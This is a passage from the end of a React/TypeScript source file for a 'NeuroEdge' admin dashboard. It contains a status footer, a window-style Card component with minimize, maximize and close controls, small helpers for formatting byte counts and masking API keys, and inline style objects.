      <div style={{ marginTop: 14, color: "#94a3b8", fontSize: "0.8rem" }}>
        {canAccessAdminOps ? (
          <>
            Kernel Snapshot: {kernels.map((k) => `${k.name}:${k.status}`).join(" | ") || "none"}
            {" • "}
            Messages: {localMsgStats.total} (errors {localMsgStats.errors}, warnings {localMsgStats.warnings})
            {" • "}
            Version: {adminVersion.orchestratorVersion || "unknown"} / Doctrine v{String(adminVersion.doctrineVersion || "-")}
          </>
        ) : (
          <>NeuroEdge workspace active</>
        )}
      </div>
    </div>
  );
};

const Card: React.FC<{ title: string; children: React.ReactNode }> = ({ title, children }) => {
  const [minimized, setMinimized] = useState(false);
  const [maximized, setMaximized] = useState(false);
  const [closed, setClosed] = useState(false);

  if (closed) {
    return (
      <button style={{ ...chip, justifySelf: "start" }} onClick={() => setClosed(false)}>
        Reopen: {title}
      </button>
    );
  }

  return (
    <div style={maximized ? { ...card, ...cardMaximized } : card}>
      <div style={cardHeader}>
        <h3 style={{ margin: 0 }}>{title}</h3>
        <div style={{ display: "flex", gap: 6 }}>
          <button style={winBtn} onClick={() => setMinimized((v) => !v)} title={minimized ? "Expand" : "Minimize"}>
            {minimized ? "▢" : "–"}
          </button>
          <button style={winBtn} onClick={() => setMaximized((v) => !v)} title={maximized ? "Restore" : "Maximize"}>
            {maximized ? "❐" : "□"}
          </button>
          <button style={winBtn} onClick={() => setClosed(true)} title="Close">
            ✕
          </button>
        </div>
      </div>
      {!minimized && <div style={{ display: "grid", gap: 8 }}>{children}</div>}
    </div>
  );
};

const Stat: React.FC<{ label: string; value: string }> = ({ label, value }) => (
  <div style={row}>
    <span style={muted}>{label}</span>
    <strong>{value}</strong>
  </div>
);

function formatBytes(bytes: number) {
  if (!bytes) return "0 B";
  const units = ["B", "KB", "MB", "GB", "TB"];
  let n = bytes;
  let i = 0;
  while (n >= 1024 && i < units.length - 1) {
    n /= 1024;
    i += 1;
  }
  return `${n.toFixed(1)} ${units[i]}`;
}

function maskKey(key: string) {
  if (!key) return "not set";
  if (key.length < 8) return "****";
  return `${key.slice(0, 4)}...${key.slice(-4)}`;
}

const page: React.CSSProperties = {
  padding: "1.2rem",
  overflowY: "auto",
  height: "100%",
  background:
    "radial-gradient(circle at 0% 0%, rgba(56,189,248,0.2), transparent 30%), radial-gradient(circle at 100% 0%, rgba(37,99,235,0.2), transparent 30%), linear-gradient(180deg,#0f172a,#0b1220)",
  color: "#e2e8f0",
  fontFamily: "'Space Grotesk', system-ui, sans-serif",
};

const hero: React.CSSProperties = {
  marginBottom: 12,
  padding: "0.9rem 1rem",
  borderRadius: 14,
  border: "1px solid rgba(148,163,184,0.28)",
  background: "rgba(15,23,42,0.72)",
};

const serviceGrid: React.CSSProperties = {
  display: "flex",
  flexWrap: "wrap",
  gap: 8,
  marginBottom: 12,
};

const serviceChip = (status: ServiceStatus["status"]): React.CSSProperties => ({
  display: "grid",
  minWidth: 170,
  gap: 3,
  borderRadius: 10,
  border: "1px solid rgba(148,163,184,0.25)",
  padding: "0.5rem 0.66rem",
  background:
    status === "online" ? "rgba(34,197,94,0.16)" : status === "degraded" ? "rgba(250,204,21,0.16)" : "rgba(239,68,68,0.16)",
});

const tabs: React.CSSProperties = { display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 12 };

const tab = (active: boolean): React.CSSProperties => ({
  border: active ? "1px solid rgba(125,211,252,0.8)" : "1px solid rgba(148,163,184,0.3)",
  borderRadius: 9,
  background: active ? "rgba(30,64,175,0.35)" : "rgba(15,23,42,0.7)",
  color: "#e2e8f0",
  padding: "0.42rem 0.72rem",
  cursor: "pointer",
  fontSize: "0.78rem",
});

const grid: React.CSSProperties = {
  display: "grid",
  gridTemplateColumns: "repeat(auto-fill, minmax(320px, 1fr))",
  gap: 10,
};

const card: React.CSSProperties = {
  borderRadius: 14,
  border: "1px solid rgba(148,163,184,0.24)",
  background: "rgba(15,23,42,0.74)",
  padding: "0.88rem",
  boxShadow: "0 10px 30px rgba(2,6,23,0.35)",
};
const cardMaximized: React.CSSProperties = {
  position: "fixed",
  top: "6vh",
  left: "4vw",
  width: "92vw",
  height: "88vh",
  zIndex: 1200,
  overflow: "auto",
  backdropFilter: "blur(6px)",
};
const cardHeader: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
  justifyContent: "space-between",
  marginBottom: 10,
  gap: 8,
};
const winBtn: React.CSSProperties = {
  border: "1px solid rgba(148,163,184,0.35)",
  borderRadius: 7,
  background: "rgba(15,23,42,0.86)",
  color: "#e2e8f0",
  padding: "0.1rem 0.38rem",
  fontSize: "0.75rem",
  cursor: "pointer",
};

const row: React.CSSProperties = { display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 };
const log: React.CSSProperties = {
  border: "1px solid rgba(148,163,184,0.2)",
  borderRadius: 8,
  padding: "0.35rem 0.5rem",
  fontSize: "0.8rem",
  background: "rgba(15,23,42,0.5)",
};
const muted: React.CSSProperties = { color: "#94a3b8", fontSize: "0.82rem" };
const input: React.CSSProperties = {
  width: "100%",
  borderRadius: 8,
  border: "1px solid rgba(148,163,184,0.36)",
  background: "rgba(15,23,42,0.62)",
  color: "#e2e8f0",
  padding: "0.42rem 0.52rem",
  fontSize: "0.8rem",
};
const chip: React.CSSProperties = {
  border: "1px solid rgba(148,163,184,0.35)",
  borderRadius: 8,
  background: "rgba(15,23,42,0.8)",
  color: "#e2e8f0",
  padding: "0.28rem 0.48rem",
  fontSize: "0.74rem",
  cursor: "pointer",
};
const primary: React.CSSProperties = {
  ...chip,
  border: "none",
  background: "#2563eb",
  color: "#fff",
};

export default Dashboard;
